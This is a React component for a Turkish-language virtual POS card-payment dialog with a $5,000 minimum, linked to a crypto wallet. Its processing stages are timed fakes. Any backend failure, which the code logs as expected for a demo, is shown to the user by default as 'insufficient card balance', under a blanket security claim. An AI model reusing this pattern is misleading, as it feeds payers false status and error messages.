import { useState, useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Card, CardContent } from '@/components/ui/card';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useToast } from '@/hooks/use-toast';
import { 
  CreditCard, 
  Lock, 
  Loader2, 
  AlertCircle, 
  Building
} from 'lucide-react';
import { getBinInfo, formatCardNumber, formatExpiryDate, type CardBrand } from '@/lib/payments';
import { apiRequest } from '@/lib/queryClient';
import { useWallet } from '@/hooks/useWallet';

// Form validation schema
const virtualPosSchema = z.object({
  cardNumber: z.string().min(13, 'Geçersiz kart numarası').max(19, 'Geçersiz kart numarası'),
  cardHolder: z.string().min(2, 'Kart sahibi adı gerekli').max(50, 'Çok uzun isim'),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/([0-9]{2})$/, 'MM/YY formatında girin'),
  cvv: z.string().min(3, 'CVV gerekli').max(4, 'CVV çok uzun'),
  amount: z.coerce.number().min(5000, 'Minimum tutar $5,000 olmalıdır').max(999999999, 'Maksimum tutar $999,999,999 olmalıdır'),
});

type VirtualPosFormData = z.infer<typeof virtualPosSchema>;

interface ProcessingState {
  isProcessing: boolean;
  stage: 'validating' | 'authorizing' | 'processing' | 'completed';
  progress: number;
}

interface PaymentError {
  message: string;
  details?: string;
}

interface VirtualPosModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  campaignId: string | number;
  defaultAmount?: number;
}

export function VirtualPosModal({ open, onOpenChange, campaignId, defaultAmount = 5000 }: VirtualPosModalProps) {
  const { toast } = useToast();
  const { address: walletAddress } = useWallet();
  const [cardBrand, setCardBrand] = useState<CardBrand | null>(null);
  const [processingState, setProcessingState] = useState<ProcessingState>({
    isProcessing: false,
    stage: 'validating',
    progress: 0,
  });
  const [paymentError, setPaymentError] = useState<PaymentError | null>(null);

  const form = useForm<VirtualPosFormData>({
    resolver: zodResolver(virtualPosSchema),
    defaultValues: {
      cardNumber: '',
      cardHolder: '',
      expiryDate: '',
      cvv: '',
      amount: defaultAmount,
    },
  });

  const handleCardNumberChange = (value: string) => {
    const cleanValue = value.replace(/\D/g, '');
    const formatted = formatCardNumber(cleanValue);
    form.setValue('cardNumber', formatted);
    
    if (cleanValue.length >= 6) {
      const bin = cleanValue.substring(0, 6);
      const brandInfo = getBinInfo(bin);
      setCardBrand({
        name: brandInfo.brand as any,
        cvvLength: brandInfo.cvvLength,
        cardLengths: [],
        color: brandInfo.brand === 'visa' ? '#1A1F71' : brandInfo.brand === 'mastercard' ? '#EB001B' : '#006FCF',
      });
      
      if (brandInfo) {
        const currentCvv = form.getValues('cvv');
        if (currentCvv && currentCvv.length > brandInfo.cvvLength) {
          form.setValue('cvv', currentCvv.substring(0, brandInfo.cvvLength));
        }
      }
    } else {
      setCardBrand(null);
    }
  };

  const handleExpiryChange = (value: string) => {
    const formatted = formatExpiryDate(value);
    form.setValue('expiryDate', formatted);
  };

  const getBrandIcon = (brand: string) => {
    switch (brand.toLowerCase()) {
      case 'visa':
        return '💳';
      case 'mastercard':
        return '🔴';
      case 'amex':
      case 'american express':
        return '🔵';
      case 'discover':
        return '🟠';
      default:
        return '💳';
    }
  };

  const getProcessingStageText = (stage: string) => {
    switch (stage) {
      case 'validating':
        return 'Kart bilgileri doğrulanıyor...';
      case 'authorizing':
        return 'Ödeme yetkilendiriliyor...';
      case 'processing':
        return 'İşlem gerçekleştiriliyor...';
      case 'completed':
        return 'İşlem tamamlandı';
      default:
        return 'İşleniyor...';
    }
  };

  const processPayment = async (data: VirtualPosFormData): Promise<void> => {
    setPaymentError(null);
    setProcessingState({ isProcessing: true, stage: 'validating', progress: 25 });

    try {
      await new Promise(resolve => setTimeout(resolve, 1000));
      setProcessingState({ isProcessing: true, stage: 'authorizing', progress: 50 });
      
      await new Promise(resolve => setTimeout(resolve, 1500));
      setProcessingState({ isProcessing: true, stage: 'processing', progress: 75 });

      const cleanCardNumber = data.cardNumber.replace(/\s/g, '');
      const [expMonth, expYear] = data.expiryDate.split('/');
      
      const paymentData = {
        bin: cleanCardNumber.substring(0, 6),
        last4: cleanCardNumber.substring(cleanCardNumber.length - 4),
        brand: cardBrand?.name || 'unknown',
        expMonth: parseInt(expMonth),
        expYear: parseInt('20' + expYear),
        amount: data.amount,
        currency: 'USD',
        cvvLength: data.cvv.length,
      };

      console.log('🏦 Virtual POS: Processing payment with backend API', { paymentData });
      console.log('🏦 Virtual POS: Making API call to /api/virtual-pos/authorize');

      try {
        const response = await fetch('/api/virtual-pos/authorize', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(paymentData),
        });

        const result = await response.json();

        await new Promise(resolve => setTimeout(resolve, 2000));
        setProcessingState({ isProcessing: true, stage: 'completed', progress: 100 });
        
        if (result.success) {
          toast({
            title: "Ödeme Başarılı",
            description: `$${data.amount.toLocaleString()} tutarında ödemeniz başarıyla işlendi.`,
          });
          onOpenChange(false);
          form.reset();
        } else {
          throw result;
        }
      } catch (apiError: any) {
        throw apiError;
      }

    } catch (error: any) {
      console.log('🏦 Virtual POS: API error (expected for demo)', error);
      
      // Record failed payment attempt to backend
      if (walletAddress) {
        try {
          const cleanCardNumber = data.cardNumber.replace(/\s/g, '');
          await apiRequest('POST', '/api/record-payment-attempt', {
            campaignId: Number(campaignId),
            initiatorWallet: walletAddress,
            amount: data.amount.toString(),
            currency: 'USD',
            cardBrand: cardBrand?.name || 'unknown',
            cardLast4: cleanCardNumber.substring(cleanCardNumber.length - 4),
            status: 'failed',
            errorCode: error.code || 'insufficient_funds',
            errorMessage: error.message || 'Bakiye Yetersiz - Kartınızda yeterli bakiye bulunmamaktadır',
            processingTime: 2000,
            ipAddress: '0.0.0.0', // Client-side can't get real IP
            userAgent: navigator.userAgent
          });
          console.log('✅ Failed payment attempt recorded to database');
        } catch (logError) {
          console.error('Failed to log payment attempt:', logError);
          // Don't show this error to user, just log it
        }
      }
      
      setPaymentError({
        message: error.message || 'Bakiye Yetersiz',
        details: error.details || 'Kartınızda yeterli bakiye bulunmamaktadır. Lütfen başka bir kart deneyin veya bakiyenizi kontrol edin.',
      });

      toast({
        variant: "destructive",
        title: "Ödeme Hatası",
        description: error.message || 'Bakiye Yetersiz',
      });
    } finally {
      setProcessingState({ isProcessing: false, stage: 'validating', progress: 0 });
    }
  };

  const onSubmit = async (data: VirtualPosFormData) => {
    await processPayment(data);
  };

  // Reset form when modal opens
  useEffect(() => {
    if (open) {
      form.reset({
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
        amount: defaultAmount,
      });
      setCardBrand(null);
      setPaymentError(null);
      setProcessingState({ isProcessing: false, stage: 'validating', progress: 0 });
    }
  }, [open, form, defaultAmount]);

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-2xl max-h-[90vh] overflow-y-auto" data-testid="dialog-virtual-pos">
        <DialogHeader>
          <div className="flex items-center space-x-2 mb-2">
            <Building className="w-5 h-5 text-primary" />
            <span className="font-semibold text-primary">DUXXAN Platform</span>
          </div>
          <DialogTitle className="text-2xl font-bold">
            Sanal POS Sistemi
          </DialogTitle>
          <DialogDescription>
            Güvenli kredi kartı ödeme sistemi
          </DialogDescription>
        </DialogHeader>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            
            {/* Card Number Field */}
            <FormField
              control={form.control}
              name="cardNumber"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Kart Numarası</FormLabel>
                  <FormControl>
                    <div className="relative">
                      <Input
                        {...field}
                        placeholder="1234 5678 9012 3456"
                        maxLength={23}
                        onChange={(e) => handleCardNumberChange(e.target.value)}
                        data-testid="input-card-number"
                        className="pr-12"
                      />
                      {cardBrand && (
                        <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                          <Badge variant="outline" className="text-xs">
                            {getBrandIcon(cardBrand.name)} {cardBrand.name.toUpperCase()}
                          </Badge>
                        </div>
                      )}
                    </div>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Card Holder Name */}
            <FormField
              control={form.control}
              name="cardHolder"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Kart Sahibi Adı</FormLabel>
                  <FormControl>
                    <Input
                      {...field}
                      placeholder="MEHMET YILMAZ"
                      onChange={(e) => field.onChange(e.target.value.toUpperCase())}
                      data-testid="input-card-holder"
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Expiry and CVV Row */}
            <div className="grid grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="expiryDate"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Son Kullanma Tarihi</FormLabel>
                    <FormControl>
                      <Input
                        {...field}
                        placeholder="MM/YY"
                        maxLength={5}
                        onChange={(e) => handleExpiryChange(e.target.value)}
                        data-testid="input-expiry-date"
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="cvv"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>
                      CVV 
                      {cardBrand && (
                        <span className="text-xs text-muted-foreground ml-1">
                          ({cardBrand.cvvLength} hane)
                        </span>
                      )}
                    </FormLabel>
                    <FormControl>
                      <Input
                        {...field}
                        type="password"
                        placeholder="123"
                        maxLength={cardBrand?.cvvLength || 4}
                        onChange={(e) => field.onChange(e.target.value.replace(/\D/g, ''))}
                        data-testid="input-cvv"
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>

            {/* Amount Field */}
            <FormField
              control={form.control}
              name="amount"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Ödeme Tutarı (USD)</FormLabel>
                  <FormControl>
                    <div className="relative">
                      <Input
                        {...field}
                        type="number"
                        min="5000"
                        step="100"
                        placeholder="5,000"
                        onChange={(e) => {
                          const value = e.target.value;
                          field.onChange(value === '' ? '' : Number(value));
                        }}
                        data-testid="input-amount"
                        className="pl-8"
                      />
                      <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground">
                        $
                      </span>
                    </div>
                  </FormControl>
                  <FormMessage />
                  <p className="text-xs text-muted-foreground mt-1">
                    Minimum tutar: $5,000 USD
                  </p>
                </FormItem>
              )}
            />

            {/* Processing State */}
            {processingState.isProcessing && (
              <Card className="bg-primary/5 border-primary/20">
                <CardContent className="p-4">
                  <div className="flex items-center space-x-3">
                    <Loader2 className="w-5 h-5 animate-spin text-primary" />
                    <div className="flex-1">
                      <p className="text-sm font-medium text-primary">
                        {getProcessingStageText(processingState.stage)}
                      </p>
                      <div className="mt-2 w-full bg-primary/20 rounded-full h-2">
                        <div 
                          className="bg-primary h-2 rounded-full transition-all duration-1000"
                          style={{ width: `${processingState.progress}%` }}
                        />
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Error Display */}
            {paymentError && (
              <Alert variant="destructive">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>
                  <div className="font-semibold">{paymentError.message}</div>
                  {paymentError.details && (
                    <div className="text-sm mt-1">{paymentError.details}</div>
                  )}
                </AlertDescription>
              </Alert>
            )}

            {/* Submit Button */}
            <Button
              type="submit"
              className="btn-binance w-full"
              size="lg"
              disabled={processingState.isProcessing}
              data-testid="button-pay-now"
            >
              {processingState.isProcessing ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  İşleniyor...
                </>
              ) : (
                <>
                  <CreditCard className="w-4 h-4 mr-2" />
                  ${form.watch('amount')?.toLocaleString() || '5,000'}.00 Öde
                </>
              )}
            </Button>

            {/* Security Notice */}
            <div className="text-center text-xs text-muted-foreground">
              <Lock className="w-3 h-3 inline mr-1" />
              SSL şifreleme ile korunmaktadır. Güvenli ödeme işlemi.
            </div>
          </form>
        </Form>
      </DialogContent>
    </Dialog>
  );
}